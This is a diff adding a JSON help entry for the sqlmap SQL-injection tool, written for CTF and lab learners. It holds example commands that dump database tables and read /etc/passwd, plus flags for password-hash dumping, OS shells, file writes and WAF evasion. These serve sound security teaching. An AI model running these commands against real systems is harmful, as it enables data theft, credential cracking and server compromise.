@@ -1,0 +1,233 @@
+{
+ "name": "sqlmap",
+ "section": "1",
+ "one_line": "automatic SQL injection and database takeover tool",
+ "plain": [
+  "`sqlmap` tests a web request for SQL injection and, when it finds a hole, can list databases, tables and columns and dump the data. It automates what you would otherwise do by hand with quotes and UNION SELECT.",
+  "Give it a URL with a parameter (or a saved request) and it tries many injection techniques, learns the database type and shows what it can read. It only works on targets where you have permission, such as a CTF or your own lab."
+ ],
+ "when": [
+  "Check whether a parameter is injectable.",
+  "List databases, tables and columns of a vulnerable lab app.",
+  "Dump a table that holds the flag.",
+  "Reuse a request captured in Burp."
+ ],
+ "examples": [
+  {
+   "title": "Test a URL parameter",
+   "cmd": "sqlmap -u 'http://10.10.10.5/item.php?id=1' --batch",
+   "explain": "-u names the target; the parameter to test is the one in the query string. --batch accepts the defaults so no questions are asked."
+  },
+  {
+   "title": "List the databases",
+   "cmd": "sqlmap -u 'http://10.10.10.5/item.php?id=1' --dbs --batch",
+   "explain": "--dbs asks the injected query for the names of the databases."
+  },
+  {
+   "title": "List tables, then dump one",
+   "cmd": "sqlmap -u 'http://10.10.10.5/item.php?id=1' -D shop --tables\nsqlmap -u 'http://10.10.10.5/item.php?id=1' -D shop -T users --dump",
+   "explain": "-D picks a database, -T a table. --dump downloads every row. Do it in two steps so you only take what you need."
+  },
+  {
+   "title": "Use a saved request",
+   "cmd": "sqlmap -r request.txt --batch",
+   "explain": "-r reads a raw HTTP request you saved from Burp, including cookies and POST body."
+  },
+  {
+   "title": "A POST form",
+   "cmd": "sqlmap -u http://10.10.10.5/login --data 'user=a&pass=b' -p user --batch",
+   "explain": "--data gives the POST body and -p chooses the field to test."
+  },
+  {
+   "title": "Raise the level of testing",
+   "cmd": "sqlmap -u 'http://10.10.10.5/item.php?id=1' --level 3 --risk 2 --batch",
+   "explain": "--level adds more places to test (cookies, headers); --risk adds heavier payloads. Higher is slower and noisier."
+  },
+  {
+   "title": "Read a file",
+   "cmd": "sqlmap -u 'http://10.10.10.5/item.php?id=1' --file-read=/etc/passwd",
+   "explain": "Asks the database to read a file from the server, if the database user has the right. Lab targets only."
+  }
+ ],
+ "options": [
+  {
+   "flag": "-u URL",
+   "plain": "Target URL with parameters.",
+   "use": "A GET target."
+  },
+  {
+   "flag": "-r FILE",
+   "plain": "Load the HTTP request from a file.",
+   "use": "Complex requests."
+  },
+  {
+   "flag": "--data=DATA",
+   "plain": "POST body.",
+   "use": "Forms."
+  },
+  {
+   "flag": "--cookie=COOKIE",
+   "plain": "Cookie header value.",
+   "use": "Logged-in tests."
+  },
+  {
+   "flag": "-H / --headers",
+   "plain": "Extra headers.",
+   "use": "Tokens."
+  },
+  {
+   "flag": "--method=METHOD",
+   "plain": "Force the method.",
+   "use": "PUT and others."
+  },
+  {
+   "flag": "-p PARAM",
+   "plain": "Test only this parameter.",
+   "use": "Faster, focused."
+  },
+  {
+   "flag": "--skip=PARAM",
+   "plain": "Skip this parameter.",
+   "use": "Ignoring noise."
+  },
+  {
+   "flag": "--level=1-5",
+   "plain": "Depth of tests.",
+   "use": "Hidden injection points."
+  },
+  {
+   "flag": "--risk=1-3",
+   "plain": "Risk of payloads.",
+   "use": "Harder cases."
+  },
+  {
+   "flag": "--technique=BEUSTQ",
+   "plain": "Choose techniques: Boolean, Error, Union, Stacked, Time, Query.",
+   "use": "Restricting to what works."
+  },
+  {
+   "flag": "--dbms=NAME",
+   "plain": "Force the database type.",
+   "use": "Saving time."
+  },
+  {
+   "flag": "--batch",
+   "plain": "Never ask; use defaults.",
+   "use": "Scripts and fast runs."
+  },
+  {
+   "flag": "--dbs",
+   "plain": "List databases.",
+   "use": "First step."
+  },
+  {
+   "flag": "--tables",
+   "plain": "List tables.",
+   "use": "After picking -D."
+  },
+  {
+   "flag": "--columns",
+   "plain": "List columns.",
+   "use": "After picking -T."
+  },
+  {
+   "flag": "--dump",
+   "plain": "Dump table data.",
+   "use": "Getting the data."
+  },
+  {
+   "flag": "--dump-all",
+   "plain": "Dump everything.",
+   "use": "Noisy; use with care."
+  },
+  {
+   "flag": "-D / -T / -C",
+   "plain": "Choose database, table, columns.",
+   "use": "Focus."
+  },
+  {
+   "flag": "--current-user / --current-db / --is-dba",
+   "plain": "Who am I and what rights?",
+   "use": "Understanding access."
+  },
+  {
+   "flag": "--passwords",
+   "plain": "Dump database password hashes.",
+   "use": "Then crack with john or hashcat."
+  },
+  {
+   "flag": "--sql-shell",
+   "plain": "Run SQL interactively.",
+   "use": "Custom queries."
+  },
+  {
+   "flag": "--os-shell",
+   "plain": "Interactive operating-system shell if possible.",
+   "use": "Authorised labs only."
+  },
+  {
+   "flag": "--file-read / --file-write / --file-dest",
+   "plain": "Read or write files on the server.",
+   "use": "Labs."
+  },
+  {
+   "flag": "--proxy=URL",
+   "plain": "Send through a proxy.",
+   "use": "Inspect in Burp."
+  },
+  {
+   "flag": "--random-agent",
+   "plain": "Random browser user agent.",
+   "use": "Avoiding simple blocks."
+  },
+  {
+   "flag": "--delay=N / --timeout=N / --retries=N",
+   "plain": "Pacing and reliability.",
+   "use": "Flaky targets."
+  },
+  {
+   "flag": "--tamper=SCRIPT",
+   "plain": "Use a script that disguises payloads.",
+   "use": "Filters and WAFs."
+  },
+  {
+   "flag": "--forms",
+   "plain": "Test the forms on the page.",
+   "use": "Finding inputs automatically."
+  },
+  {
+   "flag": "--crawl=N",
+   "plain": "Crawl the site to this depth.",
+   "use": "Finding more targets."
+  },
+  {
+   "flag": "--flush-session",
+   "plain": "Forget earlier results.",
+   "use": "Starting over."
+  },
+  {
+   "flag": "-v N",
+   "plain": "Verbosity 0-6.",
+   "use": "Seeing payloads."
+  },
+  {
+   "flag": "-h / -hh",
+   "plain": "Basic / full help.",
+   "use": "A reminder."
+  }
+ ],
+ "mistakes": [
+  "Running --dump-all on a big database: slow and loud. Take one table.",
+  "Testing the wrong parameter: use -p.",
+  "Letting --batch make choices you did not review.",
+  "Forgetting cookies: the page then redirects to login and everything looks safe.",
+  "Using it on systems you are not authorised to test."
+ ],
+ "try": [
+  "Capture a request in Burp, save it and run sqlmap -r on a lab app.",
+  "List databases, then tables, then dump only the users table.",
+  "Crack any password hash you get with john."
+ ],
+ "see_also": "burpsuite, curl(1), john(8), hashcat(1), and the OWASP SQL injection pages.",
+ "captured_with": "Examples are written to explain a technique; they are not captured output."
+}
